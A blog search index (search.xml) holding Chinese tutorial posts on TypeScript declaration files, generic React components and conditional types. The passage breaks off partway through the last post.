<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TypeScript全解：JS&amp;TS</title>
      <link href="/Blog/2023/06/17/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9AJS-TS/index/"/>
      <url>/Blog/2023/06/17/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9AJS-TS/index/</url>
      
        <content type="html"><![CDATA[<h2 id="d-ts-文件的妙用"><a href="#d-ts-文件的妙用" class="headerlink" title="d.ts 文件的妙用"></a>d.ts 文件的妙用</h2><p>默认情况下</p><p>*.d.ts 中的 type，interface 全局生效</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types.d.ts</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.ts</span></span><br><span class="line"><span class="keyword">type</span> A = <span class="title class_">User</span></span><br></pre></td></tr></table></figure><p>但如果 *.d.ts 里有 import 或 export，则 User 只在当前模块生效</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types.d.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.ts</span></span><br><span class="line"><span class="keyword">type</span> A = <span class="title class_">User</span> <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br></pre></td></tr></table></figure><p>但是加了import 或 export，还想全局生效怎么做？用 declare global</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types.d.ts</span></span><br><span class="line"><span class="keyword">import</span> x <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Local</span> = <span class="built_in">string</span>; <span class="comment">// <span class="doctag">TODO:</span> 注意这里不是全局的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">global</span> &#123;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="d-ts-与-JS-文件结合"><a href="#d-ts-与-JS-文件结合" class="headerlink" title="d.ts 与 JS 文件结合"></a>d.ts 与 JS 文件结合</h2><p>假设你已经有如下 JS 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x.js</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">addOne</span> = <span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在你想在你的 TS 文件中直接使用，虽然功能上可以，但是会有类型报错</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.ts</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="title function_">addOne</span>(<span class="number">1</span>) <span class="comment">// <span class="doctag">TODO:</span> 报错，会提示你没有这个函数</span></span><br></pre></td></tr></table></figure><p>所以我们需要声明一下</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// global.d.ts</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">addOne</span>: <span class="function">(<span class="params">n: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">AddOne</span> = <span class="function">(<span class="params">n: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span> <span class="comment">// 类型声明</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">addOne</span>:<span class="title class_">AddOne</span> <span class="comment">// 变量声明</span></span><br></pre></td></tr></table></figure><p>这样的弊端就在，如果你这里的类型写错了，TS 也不能帮你检测出来</p><p>但是实际场景，已经没有人写这样的代码了，实际我们会遇到这样的 JS 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x.js</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; a + b</span><br><span class="line"><span class="keyword">export</span> &#123; add &#125;</span><br></pre></td></tr></table></figure><p>如果我们在 TS 文件中直接使用，会提示你这是一个 JS 模块，没有类型，TS 不能直接使用</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; add &#125; <span class="keyword">from</span> <span class="string">&#x27;./x&#x27;</span></span><br></pre></td></tr></table></figure><p>所以我们一般会直接在同级目录下新建相同名字的 *.d.ts</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">add</span>: <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; add &#125;</span><br></pre></td></tr></table></figure><p>这样 TS 就能帮你自动建立关联</p><h2 id="d-ts-与-浏览器"><a href="#d-ts-与-浏览器" class="headerlink" title="d.ts 与 浏览器"></a>d.ts 与 浏览器</h2><p>当我们有如下代码的时候，这里的类型哪里来的呢？</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>) <span class="comment">// <span class="doctag">TODO:</span> 这里的 app 直接就有类型了</span></span><br></pre></td></tr></table></figure><p>是 tsconfig 里面加载好了的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> tsconfig.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;lib&quot;</span>: [<span class="string">&quot;ESNext&quot;</span>, <span class="string">&quot;DOM&quot;</span>] <span class="regexp">//</span> 这里的 DOM</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那这个 DOM 相关的文件哪里来的呢？</p><p>是社区的程序员们一行一行写好的，然后要么通过 github 上下载下来的，或从 npm 下载下来的，这样我们才能很舒服的写代码，如果没有这些文件，最基础的 JS 代码都没有类型提示</p><h2 id="d-ts-JS-React"><a href="#d-ts-JS-React" class="headerlink" title="*.d.ts + JS + React"></a>*.d.ts + JS + React</h2><p>正常我们是无法在 TS 中使用 React 的，因为 React 源码是用的 flow，而不是 TS</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span> <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br></pre></td></tr></table></figure><p>但是我们可以通过 <code>npm add -D @types/react</code>，就能解决这个问题</p><p>所以说如果 node_modules&#x2F;xxx 如果没有提供类型声明，就会去 node_modules&#x2F;@types&#x2F;xxx 去寻找</p><p>这也是 React 团队的解决思路，但是比不上 Vue 团队的方案好</p><h2 id="d-ts-JS-Vue3"><a href="#d-ts-JS-Vue3" class="headerlink" title="*.d.ts + JS + Vue3"></a>*.d.ts + JS + Vue3</h2><p>我们下载完后发现可以直接使用</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br></pre></td></tr></table></figure><p>通过看包的源码得：</p><p><img src="/Blog/2023/06/17/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9AJS-TS/index/img.png"></p><p>原来是 vue 的 package.json 声明了 types 属性，所以我们就不用额外下载关联了</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>*.d.ts 的来历<ul><li>源码是 JS&#x2F;Flow<ul><li>手写 *.d.ts</li></ul></li><li>源码是 TS<ul><li>自动生成 *.d.ts</li><li>tsc -d x.ts</li><li><a href="https://www.typescriptlang.org/tsconfig#declaration">tsconfig</a></li></ul></li></ul></li></ul><h2 id="d-ts-与-Node-js"><a href="#d-ts-与-Node-js" class="headerlink" title="*.d.ts 与 Node.js"></a>*.d.ts 与 Node.js</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span> <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br></pre></td></tr></table></figure><p>Node 也是一样，需要安装 @types&#x2F;node，和 React 一样，为什么还要单独讲呢？我们看一下源码</p><p><img src="/Blog/2023/06/17/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9AJS-TS/index/img_1.png"></p><p>可以看到里面有一堆的 reference，这些是干嘛用的呢？</p><ul><li>reference lib – 引入一个 lib（有点像 tsconfig 里面的 lib 选项）</li><li>reference path – 引入一个相对路径的文件</li><li>reference types&#x3D;”node” – 引入一个 types（有点像 tsconfig 里面的 types 选项）</li></ul><blockquote><p>Node 为什么要用这么奇怪的语法呢？<br>因为早些年 TS 出生的时候，那个时候还没有 ES modules，所以 TS 不得不发明一种模块引入语法</p></blockquote><p>如果你的 tsconfig 里 types里没有没有包涵你想使用的类型，如：node，你可以这样手动添加</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;reference types=&quot;node&quot;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>给 JS 添加类型声明的方式</p><ul><li>用 global.d.ts 声明全局变量</li><li>用 types.d.ts 声明全局类型<ul><li>如果 import &#x2F; export 了，就用 declare global</li></ul></li><li>用 同名.d.ts 声明类型模块</li><li>用 @types&#x2F;xxx 给 xxx 添加类型声明</li></ul>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>React 泛型组件是什么？</title>
      <link href="/Blog/2023/06/16/typescript/React%20%E6%B3%9B%E5%9E%8B%E7%BB%84%E4%BB%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/index/"/>
      <url>/Blog/2023/06/16/typescript/React%20%E6%B3%9B%E5%9E%8B%E7%BB%84%E4%BB%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>假设我们要做一个很简单的 Show 组件，用法如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Show </span><br><span class="line">  content<span class="operator">=</span><span class="string">&quot;hi&quot;</span> </span><br><span class="line">  onClick<span class="operator">=</span>&#123;c <span class="operator">=</span>&gt; console.log(c)&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p>Show 组件会展示 content，并在用户点击 content 时把 content 传给 onClick。</p><p>因此代码中的 c 和 content 总是相等的。</p><p>你会如何实现 Show 组件呢？假设你是这么写的：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Props</span>&#123;</span><br><span class="line">  <span class="attr">content</span>: <span class="built_in">any</span></span><br><span class="line">  onClick?: <span class="function">(<span class="params">arg: <span class="built_in">any</span></span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Show</span>(<span class="params">props: Props</span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;content, onClick&#125; = props</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;content&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;()</span>=&gt;</span> onClick?.(content)&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        Click me</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确实能完成功能，但是用到了两个 any，这不是 TypeScript，这是 AnyScript。</p><h2 id="改写"><a href="#改写" class="headerlink" title="改写"></a>改写</h2><p>于是你可以打算进行改写，你发现 content 和 onClick 的参数其实总是一样的，于是你写成这样：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="symbol">Props</span>&lt;<span class="symbol">T</span>&gt;&#123;</span><br><span class="line">  content: T</span><br><span class="line">  onClick?: (arg: T) =&gt; <span class="built_in">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但此时，Show 报错了：</p><p><img src="/Blog/2023/06/16/typescript/React%20%E6%B3%9B%E5%9E%8B%E7%BB%84%E4%BB%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/index/img.png"></p><p>报错内容是 Props 需要接受一个参数 T，于是你让 Show 接受一个参数 T，再把 T 传给 Props：</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Show<span class="operator">&lt;</span><span class="built_in">T</span><span class="operator">&gt;</span><span class="punctuation">(</span>props<span class="operator">:</span> Props<span class="operator">&lt;</span><span class="built_in">T</span><span class="operator">&gt;</span><span class="punctuation">)</span><span class="punctuation">&#123;</span> ...</span><br></pre></td></tr></table></figure><p>报错消除了。</p><p>于是 Show 组件就可以这样用了：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Show&lt;string&gt; </span><br><span class="line">  content<span class="operator">=</span><span class="string">&quot;hi&quot;</span> </span><br><span class="line">  onClick<span class="operator">=</span>&#123;c <span class="operator">=</span>&gt; console.log(c)&#125;/&gt;</span><br></pre></td></tr></table></figure><p>由于 TypeScript 有自动推断功能，所以可以从 content 自动推断出 T &#x3D; string，所以可以简写成这样：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Show</span><br><span class="line">  content<span class="operator">=</span><span class="string">&quot;hi&quot;</span> </span><br><span class="line">  onClick<span class="operator">=</span>&#123;c <span class="operator">=</span>&gt; console.log(c)&#125;/&gt;</span><br></pre></td></tr></table></figure><p>这种写法跟最开始的写法一模一样，但是我们得到了一个大好处：c 的类型不再是 any 了，而是跟 content 保持一致：</p><p><img src="/Blog/2023/06/16/typescript/React%20%E6%B3%9B%E5%9E%8B%E7%BB%84%E4%BB%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/index/img_1.png"></p><p>以上，就是泛型组件的简单演示。</p><p>不过值得注意的是，上面的 Show 被我声明为普通函数，并没有被声明为 React.FunctionComponent，因为一旦声明成 React.FunctionComponent，就没法再加泛型了。</p><p>另外，如果你喜欢用 Class 组件，那么可以把 Show 组件写成这样：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show&lt;T&gt;</span> <span class="keyword">extends</span> <span class="title">Component&lt;Props&lt;T&gt;&gt;</span> </span>&#123;</span><br><span class="line">  render()&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;<span class="keyword">this</span>.props.content&#125;</span><br><span class="line">      &lt;button </span><br><span class="line">        onClick=&#123;</span><br><span class="line">          ()=&gt; <span class="keyword">this</span>.props.onClick?.(<span class="keyword">this</span>.props.content)&#125;</span><br><span class="line">      &gt;</span><br><span class="line">        <span class="type">Click</span> me</span><br><span class="line">      &lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> function <span class="type">App</span>() &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;<span class="type">Show</span> content=&#x27;hi&#x27; onClick=&#123;c =&gt; console.log(c)&#125; /&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实际场景"><a href="#实际场景" class="headerlink" title="实际场景"></a>实际场景</h2><p>在实际工作中，我们什么时候会遇到泛型组件呢？这里有一个典型的例子：Table 组件。</p><p>假设我们的 Table 组件是这样用的：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Table</span><br><span class="line">  data=&#123;[</span><br><span class="line">    <span class="built_in">&#123;id</span>:<span class="number">1</span>,<span class="built_in"> name</span>:<span class="string">&#x27;Alice&#x27;</span>,age:<span class="number">16</span>,gender:<span class="string">&#x27;女&#x27;</span>&#125;,</span><br><span class="line">    <span class="built_in">&#123;id</span>:<span class="number">2</span>,<span class="built_in"> name</span>:<span class="string">&#x27;Bob&#x27;</span>,age:<span class="number">16</span>,gender:<span class="string">&#x27;男&#x27;</span>&#125;,</span><br><span class="line">    <span class="built_in">&#123;id</span>:<span class="number">3</span>,<span class="built_in"> name</span>:<span class="string">&#x27;Carry&#x27;</span>,age:<span class="number">16</span>,gender:<span class="string">&#x27;男&#x27;</span>&#125;,</span><br><span class="line">  ]&#125;</span><br><span class="line">  cols=&#123;[</span><br><span class="line">    <span class="built_in">&#123;key</span>:<span class="string">&#x27;name&#x27;</span>, title:<span class="string">&#x27;姓名&#x27;</span>&#125;,</span><br><span class="line">    <span class="built_in">&#123;key</span>:<span class="string">&#x27;age&#x27;</span>, title:<span class="string">&#x27;年龄&#x27;</span>&#125;</span><br><span class="line">  ]&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p>三条数据，只展示 name 和 age，我们如何确保 cols 里的 key 一定是 data 里面的字段名呢？</p><p>用泛型即可：</p><figure class="highlight plaintext"><figcaption><span>Props<T>&#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  data: T[],</span><br><span class="line">  cols: &#123;</span><br><span class="line">    key: keyof T // cols 的 key 必须是 data item 的字段名</span><br><span class="line">    title: string</span><br><span class="line">  &#125;[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Table &lt;T&gt;(props: Props&lt;T&gt;) &#123;</span><br><span class="line">  const &#123;data, cols&#125; = props</span><br><span class="line">  return (</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">      &#123;data.map(d =&gt; </span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">          &#123;cols.map(c =&gt; </span><br><span class="line">            &lt;td&gt;&#123;d[c.key]&#125;&lt;/td&gt;  </span><br><span class="line">          )&#125;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">      )&#125;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，当你需要两个 props 的类型有关联的时候，往往可以使用泛型组件来实现。</p><h2 id="不解"><a href="#不解" class="headerlink" title="不解"></a>不解</h2><p>不过目前我很疑惑下面这段代码翻译成 TypeScript 是怎样的：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">Show</span>&lt;<span class="keyword">string</span>&gt; /&gt;</span><br></pre></td></tr></table></figure><p>虽然我知道这段代码翻译成 JavaScript 是</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">React</span>.</span></span>create<span class="constructor">Element(Show)</span></span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="constructor">_jsx(Show)</span></span><br></pre></td></tr></table></figure><p>但我并不知道翻译成 TypeScript 应该怎么写，尤其是 <string> 会被放在哪。</p><p>如果你知道，请不吝赐教。</p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：类型体操（上）</title>
      <link href="/Blog/2023/06/15/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E4%BD%93%E6%93%8D%EF%BC%88%E4%B8%8A%EF%BC%89/index/"/>
      <url>/Blog/2023/06/15/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E4%BD%93%E6%93%8D%EF%BC%88%E4%B8%8A%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>体操就是做锻炼，给你的大脑做锻炼<br>有没有什么实际的意义呢？我觉得没有，工作中用不到，只是为了锻炼而已</p></blockquote><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><p>JS:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (A &lt;= B) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TS:</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="number">1</span></span><br><span class="line"><span class="keyword">type</span> B = <span class="number">1</span> | <span class="number">2</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = A <span class="keyword">extends</span> B ? <span class="literal">true</span> : <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="加一点复杂"><a href="#加一点复杂" class="headerlink" title="加一点复杂"></a>加一点复杂</h4><p>JS:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (A&lt;= B &amp;&amp; C&lt;= D) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TS:</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = <span class="number">1</span></span><br><span class="line"><span class="keyword">type</span> B = <span class="number">1</span> | <span class="number">2</span></span><br><span class="line"><span class="keyword">type</span> C = <span class="number">3</span></span><br><span class="line"><span class="keyword">type</span> D = <span class="number">3</span> | <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = A <span class="keyword">extends</span> B</span><br><span class="line">  ? C <span class="keyword">extends</span> D</span><br><span class="line">    ? <span class="string">&#x27;true, true&#x27;</span></span><br><span class="line">    : <span class="string">&#x27;true, false&#x27;</span></span><br><span class="line">  : C <span class="keyword">extends</span> D</span><br><span class="line">    ? <span class="string">&#x27;false, true&#x27;</span></span><br><span class="line">    : <span class="string">&#x27;false, false&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>看的出来，没有 if else，TS 的代码很难看<br>这就是 TS 类型体操的蛋疼之处，并不是逻辑复杂，而是看起来复杂</p></blockquote><h4 id="判断是否是元组"><a href="#判断是否是元组" class="headerlink" title="判断是否是元组"></a>判断是否是元组</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> A = []</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">IsEmptyArray</span>&lt;T exxtends <span class="built_in">unknown</span>[]&gt; = <span class="title class_">Arr</span>[<span class="string">&#x27;length&#x27;</span>] <span class="keyword">extends</span> <span class="number">0</span> ? <span class="literal">true</span> : <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">IsEmptyArray</span>&lt;A&gt; <span class="comment">// <span class="doctag">TODO:</span> true</span></span><br></pre></td></tr></table></figure><h2 id="infer"><a href="#infer" class="headerlink" title="infer"></a>infer</h2><p>还是以上面判断是否为元组的栗子：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span 